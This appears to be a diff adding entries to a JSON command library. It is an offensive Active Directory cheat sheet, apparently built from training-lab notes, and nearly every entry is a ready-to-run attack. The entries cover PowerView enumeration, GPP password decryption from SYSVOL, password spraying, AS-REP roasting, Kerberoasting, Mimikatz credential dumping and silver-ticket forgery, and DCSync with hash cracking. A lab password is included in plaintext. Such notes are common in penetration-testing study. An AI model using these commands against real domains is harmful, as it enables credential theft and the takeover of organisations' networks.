+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetDomain\nPS> Get-NetUser | select cn,pwdlastset,lastlogon\nPS> Get-NetGroup | select cn\nPS> Get-NetGroup \"Sales Department\" | select member\nPS> Get-NetComputer ",
+    "description": "",
+    "tags": [],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "2aa149a4-1299-4a9a-a633-5dae8a264356",
+    "label": "Enumerate logged on Users to machines",
+    "command": "PS> .\\PsLoggedon.exe \\\\files04",
+    "description": "<p>Enumerate logged on Users to machines</p>",
+    "tags": [
+      "AD_Enumeration",
+      "PSLoggedon.exe",
+      "AD"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "d143e8ca-c7be-418c-ac20-e1e274f7bf0b",
+    "label": "find SPNs of service user via setspn.exe",
+    "command": "setspn -L iis_service",
+    "description": "<p>find SPNs of service user via setspn.exe</p>",
+    "tags": [
+      "AD",
+      "AD_Enumeration",
+      "setspn.exe"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "1b5f5630-387a-4ce2-a861-43d4e04358a3",
+    "label": "enumerate SPNs using powerview",
+    "command": "PS> Get-NetUser -SPN | select samaccountname,serviceprincipalname",
+    "description": "<p>enumerate SPNs using powerview</p>",
+    "tags": [],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "1f9b9cef-b2a7-4bf7-b77e-6bb6e2c4ae03",
+    "label": "Dump ACE Permissions (ACL) of an object via PowerView",
+    "command": "PS>  Get-ObjectAcl -Identity stephanie\n\nPS>  Get-ObjectAcl -Identity \"Management Department\" | ?\n{$_.ActiveDirectoryRights -eq \"GenericAll\"} | select\nSecurityIdentifier,ActiveDirectoryRights\n\nPS C:\\Tools> \"S-1-5-21-1987370270-658905905-1781884369-512\",\"S-1-5-21-1987370270-\n658905905-1781884369-1104\",\"S-1-5-32-548\",\"S-1-5-18\",\"S-1-5-21-1987370270-658905905-\n1781884369-519\" | Convert-SidToName\n\n",
+    "description": "<p>Dump ACE Permissions (ACL) of an object via PowerView</p><img src=\"local-file://profile-assets/offensive/32a16d8c-b90b-49bd-9822-c456afd02999.png\" alt=\"Pasted Image\"><img src=\"local-file://profile-assets/offensive/751d859e-60e4-49f6-a21c-4562039b4174.png\" alt=\"Pasted Image\"><p>In short, we are interested in the <span style=\"color: rgb(0, 0, 0); background-color: rgb(254, 240, 138);\">ActiveDirectoryRights</span> and <span style=\"color: rgb(0, 0, 0); background-color: rgb(254, 240, 138);\">SecurityIdentifier</span> for each object we</p><p>enumerate going forward.</p><p>The highest access permission we can have on an object is <span style=\"color: rgb(220, 38, 38); background-color: rgb(254, 240, 138);\">GenericAll</span>. <br><br></p><img src=\"local-file://profile-assets/offensive/1a430cfe-b94e-40f9-83d0-84e17d1cd6a7.png\" alt=\"Pasted Image\"><img src=\"local-file://profile-assets/offensive/f0458ba2-ab10-4519-a498-9afde429b84b.png\" alt=\"Pasted Image\"><img src=\"local-file://profile-assets/offensive/1eea5247-bdd9-42cc-b452-66b7acaf455b.png\" alt=\"Pasted Image\"><p>From a system administrator perspective, managing permissions in Active Directory can be a</p><p>tough task, especially in complex environments. Weak permissions such as the one we saw here</p><p>are often the go-to vectors for attackers since it can often help us escalate our privileges within</p><p>the domain.</p>",
+    "tags": [
+      "AD",
+      "AD_Enumeration",
+      "PowerView",
+      "ACE-ACL"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "d6196133-7adc-49a5-90ee-a9b95d3db2c2",
+    "label": "Find domain shares with Powerview ",
+    "command": "PS> Find-DomainShare\nPS> ls \\\\dc1.corp.com\\sysvol\\corp.com\\\nPS> cat \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\oldpolicy\\old-policy-backup.xml\nPS> gpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"",
+    "description": "<p>Finds domain shares, particularily like SYSVOL</p>",
+    "tags": [
+      "AD",
+      "AD_Enumeration",
+      "PowerView"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "2baf94b7-aa9e-4c19-8b94-d5bc66975d1b",
+    "label": "Password Attacks with Powershell Spray-Password ",
+    "command": "# very first step, identify password lockout thresholds:\n\nPS > net accounts \n\n# then \n\nPS > powershell -ep bypass\n\nPS > .\\Spray-Passwords.ps1 -Pass Nexus123! -Admin\n\n",
+    "description": "<p></p><p>this script use same techniques of powershell enumeration, to performa password spray attack , </p><p>Be CAREFUL with lockout policy before you do it </p><p>get the script from here </p><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1\">https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1</a></p>",
+    "tags": [
+      "AD",
+      "Windows",
+      "AD_Attacking",
+      "Windows_Attacking",
+      "Credential_Dumping",
+      "ACE-ACL"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "fbd3240b-227a-4353-a0c1-8da0cfe6d8e1",
+    "label": "AS-REP Roasting via Rubeus (better than impacket)",
+    "command": " .\\Rubeus.exe asreproast /nowrap\n\n",
+    "description": "<p>this one is better than impacket because we don't need to provide vulnerable user to AS-REP roasting , Rubeus will automatically detect it and attack it !</p>",
+    "tags": [
+      "AD",
+      "AD_Attacking",
+      "Credential_Dumping",
+      "AS-REP_Roasting",
+      "ASREPRoast"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "051a8f68-6826-428b-8d59-49c4e42f4ac6",
+    "label": "kerberoasting service (SPN) hash cracking with Rubeus",
+    "command": ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast",
+    "description": "<p>For great description, check the impacket description !! </p><p>This one also probably better because it automatically detects SPN users to perform kerberoasting</p><p></p>",
+    "tags": [
+      "AD",
+      "AD_Attacking",
+      "Rubeus",
+      "Kerberoasting"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "2d9dda54-d118-4dc7-9293-68063f1fda1a",
+    "label": "Silver Ticket Attack with Mimikatz",
+    "command": "# check first if current user has permission to service using PS iwr utility\n\nPS > iwr -UseDefaultCredentials http://web04\n\n# if no, fire mimikatz and dump the NTLM Hash of the service (imagine its hard) : \n\nmimikatz# privilege::debug\nmimikatz# sekurlsa::logonpasswords\n\n# get also  user Domain SID\n\nwhoami /user\n\n# SPN you know it already for service.. then time to generate the TGS\n\nmimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin\n\n# exit mimikatz, and check list\nklist\n\n# now check you have access :\n\nPS > iwr -UseDefaultCredentials http://web04\n",
+    "description": "<p>similar to Golden ticket (See golden ticket) , just Golden ticket is specifically for krbtgt , but Silver Attack is per service , </p><p>you need those 3 things :</p><p>• SPN password hash</p><p>• Domain SID</p><p>• Target SPN</p><p></p>",
+    "tags": [
+      "AD",
+      "AD_Attacking",
+      "Credential_Dumping",
+      "Mimikatz"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "46f6c18c-ea9d-4260-b8b6-07f679d104aa",
+    "label": "DC Sync attack with Mimikatz",
+    "command": "\nmimikaz # lsadump::dcsync /user:corp\\dave\n\nhashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r\n/usr/share/hashcat/rules/best64.rule --force",
+    "description": "<p>we can simulate from attacker machine, a ‘replication request’ going from a Domain Controller to DRS, that orders him to perform an action such as providing a user password,</p><p>To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating</p><p>Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default,</p><p>members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.</p><p></p><p>If we obtain access to a user account in one of these groups or with these rights assigned, we</p><p>can perform a dcsync1128 attack in which we impersonate a domain controller. This allows us to</p><p>request any user credentials from the domain.</p>",
+    "tags": [
+      "AD",
+      "AD_Attacking",
+      "Credential_Dumping",
+      "Mimikatz",
+      "DCSync"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "2bc3ddd9-1406-4eb1-a845-a02c83b71081",
+    "label": "DCSync attack with secretsdump",
+    "command": "impacket-secretsdump -just-dc-user dave\ncorp.com/jeffadmin:\"BrouhahaTungPerorateBroom2023\\!\"@192.168.50.70",
+    "description": "<p>similar to mimikatz one for dcsync (check it for description), but with impacket from kali , </p>",
+    "tags": [
+      "AD",
+      "AD_Attacking",
+      "DCSync",
+      "Mimikatz"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "faebf3d2-2c92-4ad0-9b90-f3094b2bb8f4",
+    "label": "shai",
+    "command": "shai hulud",
+    "description": "<p>shai hulud</p>",
+    "tags": [],
+    "color": "#3b82f6"
+  }
+]
